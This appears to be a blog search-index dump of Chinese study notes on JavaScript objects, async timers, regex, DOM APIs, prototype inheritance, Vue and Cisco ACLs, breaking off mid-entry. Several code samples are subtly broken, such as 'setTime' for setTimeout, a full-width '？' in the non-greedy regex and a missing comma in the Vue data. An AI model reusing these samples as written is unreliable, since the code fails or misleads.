p1 = createPerson({ name: 'muyang'}); 优点 不需要new 参数灵活，可以无序，因为是对象 创建对象的其他方式Object()12345678var person1 = new Object();/*这是一个空对象*/var person1 = new Object({ name : 'Chris', age : 38, greeting : function() { alert('Hi! I\\'m ' + this.name + '.'); }});/*这是一个有属性方法的对象*/ create()这个方法可以根据现有对象创建新的对象 1var person2 = Object.create(person1); 方法对象里的函数叫方法，如 12345678var xiaoming = { name: '小明', birth: 1990, age: function () { var y = new Date().getFullYear(); return y - this.birth; }}; viewthis 是一个变量，代表当前对象 需要注意的是this在哪定义，调用形式是什么，如果使用xiaoming.age()调用的话this就代表xiaoming；如果函数在外面，如 123456789function getAge () { var y = new Date().getFullYear(); return y - this.birth;}var xiaoming = { name: '小明', birth: 1990, age: getAge}; 此时如果使用getAge()调用则会代表全局对象，会返回NaN，而且必须采用xiaoming.age()这个形式调用，就算赋值给变量也不行 如果是在对象方法内定义函数，里面的this也会变回全局对象 1234567891011var xiaoming = { name: '小明', birth: 1990, age: function () { function getAgeFromBirth() { var y = new Date().getFullYear(); return y - this.birth; } return getAgeFromBirth(); }}; ​ 此时使用xiaoming.age()也会返回NaN，解决方法就是将this变量存起来传递，或者使用apply() 123456789101112var xiaoming = { name: '小明', birth: 1990, age: function () { var that = this; function getAgeFromBirth() { var y = new Date().getFullYear(); return y - that.birth; } return getAgeFromBirth(); }}; 控制this指向，函数内有一个apply()方法，第一个参数就是this指向的对象，第二个参数是数组，里面对应函数的参数 12345678910111213function getAge() { var y = new Date().getFullYear(); return y - this.birth;}var xiaoming = { name: '小明', birth: 1990, age: getAge};xiaoming.age(); // 25getAge.apply(xiaoming, []); // 25, this指向xiaoming, 参数为空 装饰器在不改变原有结构给函数添加新功能，下面给出一个示例 假如我想给console.log()添加功能：打印当前时间+内容，我可以这样做 123456oldConsoleLog = console.log;/*保留原函数*/console.log = function (arg){ let date = new Date(); return oldConsoleLog(date+'\\n'+arg);} 标准对象经常会使用这些对象，如Date等等 Date表示日期和时间 先来看看对象本身 123456Date() UTC: function UTC() length: 7 name: &quot;Date&quot; now: function now() parse: function parse() UTC：接收时间参数，返回1970年1月1日UTC 00:00:00（UNIX时间纪元）以来的毫秒数 now：返回当前时间从时间纪元以来的毫秒数 parse：可以接收字符串的时间，ISO 8601格式 有了一点原型知识，再看一下他的prototype Date.prototype &gt;folded1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950prototype: {…} constructor: function Date() getDate: function getDate() getDay: function getDay() getFullYear: function getFullYear() getHours: function getHours() getMilliseconds: function getMilliseconds() getMinutes: function getMinutes() getMonth: function getMonth() getSeconds: function getSeconds() getTime: function getTime() getTimezoneOffset: function getTimezoneOffset() getUTCDate: function getUTCDate() getUTCDay: function getUTCDay() getUTCFullYear: function getUTCFullYear() getUTCHours: function getUTCHours() getUTCMilliseconds: function getUTCMilliseconds() getUTCMinutes: function getUTCMinutes() getUTCMonth: function getUTCMonth() getUTCSeconds: function getUTCSeconds() getYear: function getYear() setDate: function setDate() setFullYear: ƒ setFullYear() setHours: ƒ setHours() setMilliseconds: ƒ setMilliseconds() setMinutes: ƒ setMinutes() setMonth: ƒ setMonth() setSeconds: ƒ setSeconds() setTime: ƒ setTime() setUTCDate: ƒ setUTCDate() setUTCFullYear: ƒ setUTCFullYear() setUTCHours: ƒ setUTCHours() setUTCMilliseconds: ƒ setUTCMilliseconds() setUTCMinutes: ƒ setUTCMinutes() setUTCMonth: ƒ setUTCMonth() setUTCSeconds: ƒ setUTCSeconds() setYear: ƒ setYear() toDateString: ƒ toDateString() toGMTString: ƒ toUTCString() toISOString: ƒ toISOString() toJSON: ƒ toJSON() toLocaleDateString: ƒ toLocaleDateString() toLocaleString: ƒ toLocaleString() toLocaleTimeString: ƒ toLocaleTimeString() toString: ƒ toString() toTimeString: ƒ toTimeString() toUTCString: ƒ toUTCString() valueOf: ƒ valueOf() Symbol(Symbol.toPrimitive): ƒ [Symbol.toPrimitive]() __proto__: Object 使用Date实例化的对象可以有这些方法，太多了我就介绍几个常用的，只需要注意月份从0开始就行了 1234567891011var now = new Date();now; // Date Mon May 25 2020 09:12:00 GMT+0800 (中国标准时间)now.getFullYear(); // 2020, 年份now.getMonth(); // 4, 月份，注意月份范围是0~11，4表示5月now.getDate(); // 25now.getDay(); // 1, 表示星期一now.getHours(); // 9, 24小时制now.getMinutes(); // 12, 分钟now.getSeconds(); // 0, 秒，我这时间卡得准不准哈哈now.getMilliseconds(); // 875, 毫秒数now.getTime(); // 1590370516029, 以number形式表示的时间戳 Date()可以接受毫秒数和时间参数，都可以以本地时间格式显示出来 MathMath &gt;folded123456789101112131415161718192021222324252627282930313233343536373839404142434445Math E: 2.718281828459045 LN10: 2.302585092994046 LN2: 0.6931471805599453 LOG10E: 0.4342944819032518 LOG2E: 1.4426950408889634 PI: 3.141592653589793 SQRT1_2: 0.7071067811865476 SQRT2: 1.4142135623730951 abs: function abs() acos: function acos() acosh: function acosh() asin: function asin() asinh: function asinh() atan: function atan() atan2: function atan2() atanh: function atanh() cbrt: function cbrt() ceil: function ceil() clz32: function clz32() cos: function cos() cosh: function cosh() exp: function exp() expm1: function expm1() floor: function floor() fround: function fround() hypot: function hypot() imul: function imul() log: function log() log10: function log10() log1p: function log1p() log2: function log2() max: function max() min: function min() pow: function pow() random: function random() round: function round() sign: function sign() sin: function sin() sinh: function sinh() sqrt: function sqrt() tan: function tan() tanh: function tanh() trunc: function trunc() Symbol(Symbol.toStringTag): &quot;Math&quot; Math完全就是一个工具类，没有prototype，比较常用的就是random()，数学不好，就不过多解释了","link":"/Front-end/JavaScript/%E5%AF%B9%E8%B1%A1.html"},{"title":"JS学习之异步","text":"JavaScript是单线程的，很多任务都是堆到这个线程上的，然后一个一个的解决。 这就导致了一些问题，比如当前面有一个函数在做复杂运算时，没有将控制权返回浏览器，那么此时你无法在做其他的事，这叫阻塞。下面是官方给出的一个例子 123456789101112131415161718&lt;div class='wrapper'&gt; &lt;button class='btn'&gt;Click&lt;/button&gt;&lt;/div&gt;&lt;script&gt; const wp = document.querySelector('.wrapper'); const btn = document.querySelector('.btn'); btn.addEventListener('click', () =&gt; { let myDate; for(let i = 0; i &lt; 10000000; i++) { let date = new Date(); myDate = date; } console.log(myDate); let pElem = document.createElement('p'); pElem.textContent = 'This is a newly-added paragraph.'; wp.appendChild(pElem); })&lt;/script&gt; Click const wp = document.querySelector('.wrapper'); const btn = document.querySelector('.btn'); btn.addEventListener('click', () => { let myDate; for(let i = 0; i < 10000000; i++) { let date = new Date(); myDate = date; } console.log(myDate); let pElem = document.createElement('p'); pElem.textContent = 'This is a newly-added paragraph.'; wp.appendChild(pElem); }) 可以看到点击click后，先做复杂运算，过段时间才会显示段落p（这两个没有逻辑关系） 这表明JS是一种同步的、阻塞的、单线程的语言，一次只能执行一个操作。但web浏览器定义了函数和API，允许我们当某些事件发生时不是按照同步方式，而是异步地调用函数(比如，时间的推移，用户通过鼠标的交互，或者获取网络数据) 在网络上，异步更为重要，如下面这个例子 12var response = fetch('myImage.png');var blob = response.blob(); 因为不知道第一步下载图片的时间，所以第二步有可能会出错。需要等第一步返回才能进行第二步 有两种解决方案，以前的回调callback，和现在的promise，重点学习promise 不过在此之前要学习几个函数方便对异步的理解，这些函数设置的异步代码实际上在主线程上运行，但是您可以在迭代之间运行其他代码，运行效率或高或低，这取决于这些操作的处理器密集程度。 异步函数setTimeout()可以指定时间后运行代码 第一个参数是函数引用 第二个参数是时间间隔，单位毫秒 后面是可变参数，这些参数会传递给第一个参数的函数 返回一个标志，后续可根据这个标志使用clearTimeout取消这个任务，如 12let taskFlag = setTime(console.log, 2000, 'I love you');clearTimeout(taskFlag); 当时间间隔设置为0时，会在主线程执行后立刻执行 1234setTimeout(function() { alert('World');}, 0);alert('Hello');// Hello，world setInterval()与setTimeout的只执行一次不同，setInterval会循环执行，它的参数与setTimeout一致 一个数字时钟的例子 1234567891011&lt;div&gt; &lt;p id='demo'&gt;&lt;/p&gt;&lt;/div&gt;&lt;script&gt; function displayTime() { let date = new Date(); let time = date.toLocaleTimeString(); document.getElementById('demo').textContent = time; } const createClock = setInterval(displayTime, 1000);//每秒执行一次&lt;/script&gt; function displayTime() { let date = new Date(); let time = date.toLocaleTimeString(); document.getElementById('demo').textContent = time; } const createClock = setInterval(displayTime, 1000); 它同样会返回一个标志，使用clearInterval可以停止执行 下面是一个秒表例子 stop start reset const stop = document.querySelector('#stop'); const start = document.querySelector('#start'); const reset = document.querySelector('#reset'); let sec=0, s=0, m=0, h=0; // 存储setInterval的标志 let stopFlag; // 初始化 displayCount(); // 所有点击事件 start.onclick = () => { stopFlag = setInterval(displayCount, 1000); start.disabled = true; }; stop.onclick = () => { clearInterval(stopFlag); start.disabled = false; }; reset.onclick = () => { clearInterval(stopFlag); sec = 0; start.disabled = false; displayCount(); } function displayCount() { time(); if(s","link":"/Front-end/JavaScript/%E5%BC%82%E6%AD%A5.html"},{"title":"JS正则","text":"JS的正则表达式使用new RegExp('re',[flag])新建一个对象，或者在//里面写都可以 支持正则的方法 方法 描述 exec 5一个在字符串中执行查找匹配的RegExp方法，它返回一个数组（未匹配到则返回 null）。 test 一个在字符串中测试是否匹配的RegExp方法，它返回 true 或 false。 match 一个在字符串中执行查找匹配的String方法，它返回一个数组，在未匹配到时会返回 null。 matchAll 一个在字符串中执行查找所有匹配的String方法，它返回一个迭代器（iterator）。 search 一个在字符串中测试匹配的String方法，它返回匹配到的位置索引，或者在失败时返回-1。 replace 一个在字符串中执行查找匹配的String方法，并且使用替换字符串替换掉匹配到的子字符串。 split 一个使用正则表达式或者一个固定字符串分隔一个字符串，并将分隔后的子字符串存储到数组中的 String 方法。 搜索和替换12345let str = 'Hello world 1234 ./,;';//正则表达式的规则写在‘/ /’里let s2 = str.search(/[1-9]/i);/*也可以传递字符串，i表示忽略大小写，会返回搜索到的第一个字符的索引*/str.replace(/[a-zA-Z]/g,'test');/*g表示全局，这里代表将所有字母替换成test*/console.log(s2); 判断可以知道某字符串是否满足规则 12let re = /^#/;re.test('#这是一个注释');/*返回true*/ 切分字符串1'a,b, c d'.split(/[\\s,]+/); // ['a', 'b', 'c', 'd'] 分组123var re = /^(\\d{3})-(\\d{3,8})$/;re.exec('010-12345'); // ['010-12345', '010', '12345']re.exec('010 12345'); // null 通过exec可以提取分组里面的子串，返回一个数组，第一个元素是匹配到的整个字符串，后面跟着子串 贪婪默认匹配是贪婪模式，即尽量往多的匹配 12var re = /^(\\d+)(0*)$/;re.exec('102300'); // ['102300', '102300', ''] 非贪婪匹配12var re = /^(\\d+？)(0*)$/;re.exec('102300'); // ['102300', '1023', '00'] 特殊标志 标志 描述 g 全局搜索。 i 不区分大小写搜索。 m 多行搜索。 s 允许 . 匹配换行符。 u 使用unicode码的模式进行匹配。 y 执行“粘性”搜索,匹配从目标字符串的当前位置开始，可以使用y标志。","link":"/Front-end/JavaScript/%E6%AD%A3%E5%88%99.html"},{"title":"JS学习篇之操作浏览器、DOM","text":"浏览器浏览器内有很多对象，可以获取浏览器的相关信息 window常用属性 innerWidth：窗口宽 innerHeight：窗口高 navigator常用属性 navigator.appName：浏览器名称； navigator.appVersion：浏览器版本； navigator.language：浏览器设置的语言； navigator.platform：操作系统类型； navigator.userAgent：浏览器设定的User-Agent字符串。 12345appName = NetscapeappVersion = 5.0 (X11)language = zhplatform = Linux x86_64userAgent = Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0 screenscreen对象表示屏幕的信息，常用的属性有： screen.width：屏幕宽度，以像素为单位； screen.height：屏幕高度，以像素为单位； screen.colorDepth：返回颜色位数，如8、16、24。 location表示当前页面的URL信息，如 123456789//URL'http://www.example.com:8080/path/index.html?a=1&amp;b=2#TOP'location.protocol; // 'http'location.host; // 'www.example.com'location.port; // '8080'location.pathname; // '/path/index.html'location.search; // '?a=1&amp;b=2'location.hash; // 'TOP' location.assign(): 可以加载页面，参数是URL地址 location.reload(): 重新加载当前页面 document代表当前页面，因为DOM表示为树形结构，而document就是DOM的根节点 getElementById()：通过HTML ID获取节点 getElemenstByTagName()：通过标签名获取节点 getElementsByClassName()：通过css选择器获取节点，返回一个组 firstElementChild：获取某节点下第一个节点 lastElementChild：获取某节点下的最后一个节点 cookie：获取cookie（cookie是服务器用来判断用户的） querySelector()：参数形式’#id’,’.class’…其实就是css选择器形式的参数，找到一个就返回 querySelectorAll：返回所有满足条件的 class和selectorall会返回一个类数组，可以使用[…nodeList]转换成数组（进而使用map，reduce..） 参考文献 MDN-NodeList DOM通过doument对象取得元素，可以进行更新，修改，删除操作 更新innerHTML：比较强大，既可以修改内容，也可以修改子树（子标签） 1p.innerHTML = 'ABC &lt;span style=&quot;color:red&quot;&gt;RED&lt;/span&gt; XYZ'; innerText&amp;textContent：只修改内容，里面的标签会自动转码区别是innerText不返回隐藏元素的文本 123p.innerText = '&lt;script&gt;alert(&quot;Hi&quot;)&lt;/script&gt;';// HTML被自动编码，无法设置一个&lt;script&gt;节点:// &lt;p id=&quot;p-id&quot;&gt;&amp;lt;script&amp;gt;alert(&quot;Hi&quot;)&amp;lt;/script&amp;gt;&lt;/p&gt; 所有的css属性都对应到了DOM的style属性里，css属性名在DOM里是驼峰命名 123p.style.color = '#ff0000';p.style.fontSize = '20px';p.style.paddingTop = '2em'; 插入要在某个DOM节点插入，如果这个节点是空的，可以采用innerHTML，他会直接覆盖这个节点下的内容 appendChild(newElement)将某节点添加到子该DOM节点的最后一个节点（如果这个节点在前面存在会删除前面的） 1234var d = document.createElement('style');// 创建一个新节点d.setAttribute('type', 'text/css'); // 设置属性d.innerHTML = 'p { color: red }'; // 内容document.getElementsByTagName('head')[0].appendChild(d); // 插入点 parentElement.insertBefore(newElement, referenceElement);可以将节点添加到指定为位置 parentElement.children可以得到该节点下的所有子节点，配合insetBefore使用 删除首先获取节点，然后获取父节点，使用父节点来删除子节点 1234567// 拿到待删除节点:var self = document.getElementById('to-be-removed');// 拿到父节点:var parent = self.parentElement;// 删除:var removed = parent.removeChild(self);removed === self; // true 并没有完全删除，还在内存中 注意删除后的节点会变化 操作表单常用输入控件 文本框，对应的&lt;input type=&quot;text&quot;&gt;，用于输入文本； 口令框，对应的&lt;input type=&quot;password&quot;&gt;，用于输入口令； 单选框，对应的&lt;input type=&quot;redio&quot;&gt;，用于选择一项； 复选框，对应的&lt;input type=&quot;checkbox&quot;&gt;，用于选择多项； 下拉框，对应的&lt;select&gt;，用于选择一项； 隐藏文本，对应的&lt;input type=&quot;hidden&quot;&gt;，用户不可见，但表单提交时会把隐藏文本发送到服务器。 H5新控件 1234&lt;input type=&quot;date&quot; value=&quot;2015-07-01&quot;&gt;&lt;input type=&quot;datetime-local&quot; value=&quot;2018-06-12T19:30&quot;&gt;&lt;input type=&quot;color&quot; value=&quot;#ff0000&quot;&gt;... 不支持的浏览器会把他们当作type='text'处理，支持的就会得到一串格式化的字符 获取控件值和修改值对于text、password、hidden、select文本框，直接调用value就可以得到输入值；对于checkbox、redio单选框和复选框，调用value出现默认值，调用checked返回布尔值，代表选择情况 12345678// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;monday&quot; value=&quot;1&quot;&gt; Monday&lt;/label&gt;// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;tuesday&quot; value=&quot;2&quot;&gt; Tuesday&lt;/label&gt;var mon = document.getElementById('monday');var tue = document.getElementById('tuesday');mon.value; // '1'tue.value; // '2'mon.checked; // true或者falsetue.checked; // true或者false 修改的话直接修改value就可以了，单选框和复选框修改checked 提交表单 form.submit()这个方法代表提交 响应type='submit' 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=&quot;test-form&quot; onsubmit=&quot;return checkForm()&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;test&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function checkForm() { var form = document.getElementById('test-form'); // 可以在此修改form的input... // 继续下一步: return true;// false代表不提交}&lt;/script&gt; 操作文件H5中上传文件的控件是&lt;input type='file'&gt; 12345678910&lt;!-- form属性必须如下设置 --&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;file&quot;&gt;Choose file to upload&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot; multiple&gt; &lt;/div&gt; &lt;div&gt; &lt;button&gt;Submit&lt;/button&gt; &lt;/div&gt;&lt;/form&gt; 以前JS对于文件的操作有限，无法读取文件的内容现在的H5新增了的APIFile和FileReader可以获取文件信息和读取文件，下面是一个简单的例子 选择上传图片 提交到服务器 var fileInput = document.getElementById('image'), info = document.getElementById('info'), preview = document.getElementById('image-preview'); // 监听change事件: fileInput.addEventListener('change', function () { preview.style.display = 'block'; // 清除背景图片: preview.style.backgroundImage = ''; // 检查文件是否选择: if (!fileInput.value) { info.innerHTML = '没有选择文件'; return; } // 获取File引用: var file = fileInput.files[0]; // 获取File信息: info.innerHTML = '文件: ' + file.name + '' + '大小: ' + file.size + '' + '修改: ' + file.lastModifiedDate; if (file.type !== 'image/jpeg' && file.type !== 'image/png' && file.type !== 'image/gif') { alert('不是有效的图片文件!'); return; } // 读取文件: var reader = new FileReader(); reader.onload = function (e) { var data = e.target.result; // 'data:image/jpeg;base64,/9j/4AAQSk...(base64编码)...' preview.style.backgroundImage = 'url(' + data + ')'; }; // 以DataURL的形式读取文件: reader.readAsDataURL(file); }); 源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div id='file-wrapper'&gt; &lt;label for=&quot;image&quot;&gt;选择上传图片&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; value='test' multiple&gt; &lt;p id='info'&gt;&lt;/p&gt; &lt;div id='image-preview' style=&quot;display:none; width: 100%; height: 200px; background-size: contain; background-repeat: no-repeat; background-position: left; &quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;button&gt;提交到服务器&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;script&gt; var fileInput = document.getElementById('image'), info = document.getElementById('info'), preview = document.getElementById('image-preview'); // 监听change事件: fileInput.addEventListener('change', function () { preview.style.display = 'block'; // 清除背景图片: preview.style.backgroundImage = ''; // 检查文件是否选择: if (!fileInput.value) { info.innerHTML = '没有选择文件'; return; } // 获取File引用: var file = fileInput.files[0]; // 获取File信息: info.innerHTML = '文件: ' + file.name + '&lt;br&gt;' + '大小: ' + file.size + '&lt;br&gt;' + '修改: ' + file.lastModifiedDate; if (file.type !== 'image/jpeg' &amp;&amp; file.type !== 'image/png' &amp;&amp; file.type !== 'image/gif') { alert('不是有效的图片文件!'); return; } // 读取文件: var reader = new FileReader(); /* 回调函数，当文件读取完后自动执行这个函数 */ reader.onload = function (e) { var data = e.target.result; // 'data:image/jpeg;base64,/9j/4AAQSk...(base64编码)...' preview.style.backgroundImage = 'url(' + data + ')'; }; // 以DataURL的形式读取文件: reader.readAsDataURL(file); });&lt;/script&gt; ​","link":"/Front-end/JavaScript/%E6%B5%8F%E8%A7%88%E5%99%A8.html"},{"title":"JavaScript原型继承","text":"JavaScript 常被描述为一种基于原型的语言 (prototype-based language)——每个对象拥有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为原型链 (prototype chain)，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。 准确地说，这些属性和方法定义在Object的构造器函数(constructor functions)之上的prototype属性上，而非对象实例本身。 在传统的 OOP 中，首先定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。在 JavaScript 中并不如此复制——而是在对象实例和它的构造器之间建立一个链接（它是proto属性，是从构造函数的prototype属性派生的），之后通过上溯原型链，在构造器中找到这些属性和方法。–MDN 实例说一下自己的理解，我们在JavaScript创建的函数都有共同的属性叫prototype，它长这样 123456789101112131415161718192021222324252627function test (){}console.log(test.prototype);Object constructor: ƒ test() arguments: null caller: null length: 0 name: &quot;test&quot; prototype: {constructor: ƒ} __proto__: ƒ () [[FunctionLocation]]: VM123:1 [[Scopes]]: Scopes[2] __proto__: constructor: ƒ Object() hasOwnProperty: ƒ hasOwnProperty() isPrototypeOf: ƒ isPrototypeOf() propertyIsEnumerable: ƒ propertyIsEnumerable() toLocaleString: ƒ toLocaleString() toString: ƒ toString() valueOf: ƒ valueOf() __defineGetter__: ƒ __defineGetter__() __defineSetter__: ƒ __defineSetter__() __lookupGetter__: ƒ __lookupGetter__() __lookupSetter__: ƒ __lookupSetter__() get __proto__: ƒ __proto__() set __proto__: ƒ __proto__() 向原型中添加属性 1test.prototype.foo = 'bar'; 理解原型对象 原型链中的方法和属性没有被复制到其他对象 官方并没有规定方法可以直接访问对象原型，原型链的’连接’被定义在内部属性中，在JavaScript中用[[prototype]]表示，在使用chrome和firefox时，提供了__proto__这个属性可以访问原型对象 需要注意的是__proto__和prototype的区别，前者可以访问对象的原型对象，后者包含了一个对象，可以在里面定义被继承的成员，prototype是构造器的专属属性 而前面说的Object.create()，就是将参数里的对象作为原型对象返回一个新的对象 constructor每个实例的对象还会从原型中继承constructor属性，该属性就是这个对象的构造函数 1234let o1 = new test();//下面两种方法都可以得到构造函数o1.constructor;o1.__proto__.constructor; 用途1，利用这个构造函数创建对象 1let o2 = new o1.constructor(); 用途2，得到构造函数的各种信息 1234//名字o1.constructor.name;//参数长度o1.constructor.length; 修改原型因为原型链的特性，所以增加构造函数的原型属性时，使用构造函数实例化的对象也可以访问到这个属性，如 1234Person.prototype.newAtrribute = function(){ alert('hello'+this.name[0]);}person1.newAtrribute(); 注意上面的this是在函数里面的，在使用时就会转换为对象实例 常见的对象定义模式就是，构造器（函数体）里定义属性，prototype属性里定义方法 继承原型继承 Java的继承是规定某个类继承自某个类，而JavaScript的继承方式有点特别，被称为 原型式继承 —— prototypal inheritance 先创建一个Person类 1234567891011function Person(first, last, age, gender) { this.name = { first, last }; this.age = age; this.gender = gender;};Person.prototype.greeting = function() { alert('Hi! I\\'m ' + this.name.first + '.');}; 此时的原型链是 1new Person() ----&gt; Person.prototype ----&gt; Object.prototype ----&gt; null 然后需要创建一个Teacher类，它需要继承Person类，并添加一个新的属性subject，重写一个方法greeting，于是有 12345function Teacher(first, last, age, gender, subject) { Person.call(this, first, last, age, gender); this.subject = subject;} call()表示为Teacher调用了Person构造方法，然后第一个参数绑定this变量 如果继承的是无参函数，那么只需要传递一个this即可 但是它的原型链并没有指向Person，而是 1new Teacher() ----&gt; Teacher.prototype ----&gt; Object.prototype ----&gt; null 我们需要的是 1new Teacher() ----&gt; Teacher.prototype ----&gt; Person.prototype ----&gt; Object.prototype ----&gt; null 原型与构造器引用上面Teacher类还不完整，有两个问题 1.Teacher的原型没有继承自Person 解决方法，使用create()，得到一个原型是Person的中间对象，并将Teacher的原型指向这个对象(即Teacher的原型对象指向了Person的原型对象) 1Teacher.prototype = Object.create(Person.prototype); 2.因为使用了create()，所以Teacher的prototype的constructor指向Person，它应该指向Teacher本身，所以 12Teacher.prototype.constructor = Teacher;//再次强调，Teacher后面加括号代表调用 注：每一个函数对象（Function）都有一个prototype属性，并且只有函数对象有prototype属性，因为prototype本身就是定义在Function对象下的属性。当我们输入类似var person1=new Person(...)来构造对象时，JavaScript实际上参考的是Person.prototype指向的对象来生成person1。另一方面，Person()函数是Person.prototype的构造函数，也就是说Person===Person.prototype.constructor（不信的话可以试试）。–MDN 最后，重写greeting函数 12345678910111213Teacher.prototype.greeting = function() { var prefix; if(this.gender === 'male' || this.gender === 'Male' || this.gender === 'm' || this.gender === 'M') { prefix = 'Mr.'; } else if(this.gender === 'female' || this.gender === 'Female' || this.gender === 'f' || this.gender === 'F') { prefix = 'Mrs.'; } else { prefix = 'Mx.'; } alert('Hello. My name is ' + prefix + ' ' + this.name.last + ', and I teach ' + this.subject + '.');}; 注: 考虑到JavaScript的工作方式，由于原型链等特性的存在，在不同对象之间功能的共享通常被叫做 委托 - 特殊的对象将功能委托给通用的对象类型完成。这也许比将其称之为继承更为贴切，因为“被继承”了的功能并没有被拷贝到正在“进行继承”的对象中，相反它仍存在于通用的对象中。–MDN class继承ES6引入了calss，简化了原型继承的代码量（继承原理不变） 123456789101112131415161718192021class Person { constructor(name, age) { this.name = name; this.age = age; } greeting() { alert('Hi! I\\'m ' + this.name.first + '.'); }}class Student extends Person{ constructor(name, age, status){ super(name, age); this.status = status; } doHomework(){ alert('我在做作业'); }}s1 = new Student('manu',19,'learn') 注意兼容性再考虑是否使用class","link":"/Front-end/JavaScript/%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B.html"},{"title":"vue学习笔记","text":"Custom Elements 标准“自定义元素的名字必须包含一个破折号（-）所以、和都是正确的名字，而和是不正确的。这样的限制使得 HTML 解析器可以分辨那些是标准元素，哪些是自定义元素。”Safari 10.1+、Chrome 54+ 和 Firefox 63+ 原生支持 Web ComponentsVue里面所有东西都是响应式的 vue实例12345678var obj = { foo: 'bar'}new Vue({ el: '#app', data: obj}) 当一个 Vue 实例被创建时，它将 data 对象中的所有的 property 加入到 Vue 的响应式系统中Vue 实例还暴露了一些有用的实例 property 与方法。它们都有前缀 $，以便与用户定义的 property 区分开来详情点击API 文档 使用 Object.freeze(obj)方法，这会阻止修改现有的 property，也意味着响应系统无法再追踪变化 生命周期钩子 每个 Vue 实例在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，这给了用户在不同阶段添加自己的代码的机会。 生命周期图示 created: 在一个实例被创建之后执行代码 在定义生命周期函数时千万不要使用箭头函数，会污染外层this 模板语法文本插值1&lt;span&gt;Message: {{ msg }}&lt;/span&gt; {{msg}}会被替换成实例里的msg值 v-once指令只进行一次性的插值{{}}`不会把数据解析成html标签, 对此请使用`v-html`指令, 使用需谨慎 ### 属性插值 在属性里不能使用`{{}} 1&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt; vue规定, 对于bool值, 如果非true, 则该属性不会显示出来在{{}}和&quot; &quot;中几乎支持所有js单个表达式不应该在表达式里访问用户的全局变量 指令就是一系列以v-作为前缀的东西, 可以根据其值来影响标签在DOM的表现 比如v-bind:attr='var'用于将attr与变量var值绑定 而v-on:event='callback'用来监听DOM事件 v-bind可以简写为:v-on简写为@ 动态属性(vue&gt;=2.6.0)v-bind:[attributeName]=&quot;url&quot; attributeName被作为JS表达式解析, 也会去data里查找该值 注意: 在[]中不能使用空格和引号, 避免大小写, 必须返回字符串, null则代表移除 计算属性对于任何复杂逻辑，你都应当使用计算属性 12345678910111213141516var vm = new Vue({ el: '#example', data: { message: 'Hello' }, computed: { reversedMessage: { // 计算属性的 getter get: function () { // `this` 指向 vm 实例 return this.message.split('').reverse().join('') } // set: 可提供setter方法, 提供参数会调用这个方法 } }}) 1234&lt;div id=&quot;example&quot;&gt; &lt;p&gt;Original message: &quot;{{ message }}&quot;&lt;/p&gt; &lt;p&gt;Computed reversed message: &quot;{{ reversedMessage }}&quot;&lt;/p&gt;&lt;/div&gt; 虽然方法也能达到相同的效果, 但计算属性多了一个缓存的功能, 原始数据不改变则返回之间的计算结果 侦听器设置v-model='attr'后,attr会与data.attr双向绑定在实例化Vue时如果提供watch.attr()选项, 则数据改变同时会触发该函数 当需要在数据变化时执行异步或开销较大的操作时，这个方式是最有用的。 实例: 1234&lt;div id=&quot;watch-example&quot;&gt; &lt;input v-model=&quot;question&quot;&gt; &lt;p&gt;{{ answer }}&lt;/p&gt;&lt;/div&gt; 12345678910111213var vm = new Vue({ el: '#watch-example', data: { question: '' answer: 'I cannot give you an answer until you ask a question! }, watch: { // 侦听data的属性 // 如果 `question` 发生改变，这个函数就会运行 question: function (newQuestion, oldQuestion) { this.answer = 'Waiting for you to stop typing...' }}) 计算属性VS侦听器在一般情况下, 选择计算机属性会更好, 需要使用异步或其他开销大的操作时, 才会使用侦听器","link":"/Front-end/vue/vue%E6%8C%87%E5%8D%97.html"},{"title":"ACL","text":"ACL(访问控制列表) 是一系列被称为访问控制条目 (ACE) 的 permit 或 deny 语句组成的顺序列表。ACE 通常也称为 ACL 语句 ACE有严格的顺序要求 ACL可以用于普通接口, 也可以用于vty 标准ACL 基于源IP地址过滤数据包 标准访问控制列表的访问控制列表号是1~99 创建ACL123# configRouter(config):access-list access-list-number {permit | deny} source [source-wildcard]# wildcard(通配符) 采用子网掩码反码形式 使用ACL1234# 接口模式下ip access-group list_id in/out# 在vty模式下access-class list_id in/out 查看ACL1234# 创建的show access-lists# 启用的show running-config 由于标准 ACL 不会指定目标地址，所以其位置应该尽可能靠近目标。在流量源附近设置标准 ACL 可以有效阻止流量通过应用了 ACL 的接口到达任何其他网络 扩展ACL 基于源IP地址、目的IP地址、指定协议、端口来过滤数据包 扩展访问控制列表的访问控制列表号是100~199 创建12345access-list 100-199{permit|deny|remark} protocol_type[host] source_ip [wildcard] {lt|gt|eq..} {server_name|port}[host] destnation_ip [wildcard] {lt|gt|eq..} {server_name|port}[dscp|established|precedence] 将扩展 ACL 放置在尽可能靠近需要过滤的流量源的位置上。这样，不需要的流量会在靠近源网络的位置遭到拒绝，而无需通过网络基础设施 放置原则可以简单理解为: 扩展匹配细致, 所以放在源 标准匹配广泛, 所以放在目标 命名ACL 命名访问控制列表允许在标准和扩展访问控制列表中使用名称代替表 优点就是可以单独的增删语句, 且自定义顺序 创建1234# 创建一个命名ACL表ip 